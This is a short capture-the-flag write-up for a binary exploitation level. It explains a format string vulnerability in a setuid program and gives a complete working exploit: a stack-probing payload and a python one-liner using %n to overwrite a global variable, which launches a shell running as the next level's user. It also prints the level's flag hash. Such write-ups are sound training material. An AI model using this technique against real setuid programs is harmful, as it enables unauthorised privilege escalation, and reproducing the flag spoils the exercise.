# Level4

## 1. Context

```bash
$ id
uid=2025(level4) gid=2025(level4) groups=2025(level4),100(users)

$ pwd
/home/user/level4

$ ls -la
[...]
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
[...]
```

## 2. Program behavior

Testing it :
```bash
$ ./level4
a
a
```

Expects an input and prints it, nothing else...

## 3. Code overview

Looking at our functions, `main()` calls the function `n()`.
`n()` uses the function `p()` which is vulnerable to **format string attacks**.
Then checks the value of `m`. If `m` is equal to `0x1025544`, a shell is launched.

Our goal is to modify the value of `m`.

## 4. Exploit


```bash
$ python -c 'print "BBBB "+"%x "*12' | ./level4
BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242
```

Our buffer is stored in the 12th position in the stack.

## 4. Getting the flag

```bash
$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
$ cat /tmp/exploit | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

End of simulation
